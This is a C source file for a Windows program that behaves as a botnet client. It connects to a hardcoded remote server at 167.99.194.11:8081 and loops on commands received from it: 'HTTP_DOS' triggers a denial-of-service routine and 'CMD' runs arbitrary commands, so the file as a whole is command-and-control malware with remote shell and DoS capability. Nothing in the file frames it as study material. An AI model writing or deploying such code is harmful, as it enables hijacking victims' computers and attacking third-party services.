/*
	Create a TCP socket
	libws2_32.a

*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ctype.h>
#include <time.h>
#include <windows.h>
#include <winsock2.h>
#include "utils.h"

#pragma comment(lib,"ws2_32.lib") //Winsock Library
int expression_handler(char *command, char **token);
int main(){

	WSADATA wsa;                                        //Info about winsock implementation
	SOCKET s;
	char server_ip[15]="167.99.194.11", *buffer;
	char server_reply[256], *token;
	int recv_size,control_sock,port=8081;

    //Inizialize winsock
    do{
        control_sock=WSAStartup(MAKEWORD(2,2),&wsa);
    }while(control_sock!=0);
    s = socket(AF_INET , SOCK_STREAM , 0 );             //Initialize sock
    create_conn(s,server_ip, port);                     //Create connection
    while(1){
        recv_size=recv(s , server_reply , 100 , 0);
        server_reply[recv_size]='\0';
        int rit=expression_handler(&server_reply[0], &token);
        switch(rit){
            case(1):
                hdos_exe(token);
                break;
            case(2):
                exec_command(token,s);
                break;
            }
        }
}

int expression_handler(char *command, char **riscommand){
    char *token;
	char delim[2]=":";
	//char *token;
	int ris;

	//Divido il comando ricevuto
	token = strtok(command, delim);

	if(strcmp("HTTP_DOS",token)==0){

        token = strtok(NULL,token);

        *riscommand=token;
		//hdos_exe(token);
		return 1;
	}
	else if(strcmp("CMD",token)==0){
        token = strtok(NULL,token);
        *riscommand=token;

        return 2;
    }
    else{return 0;}
}
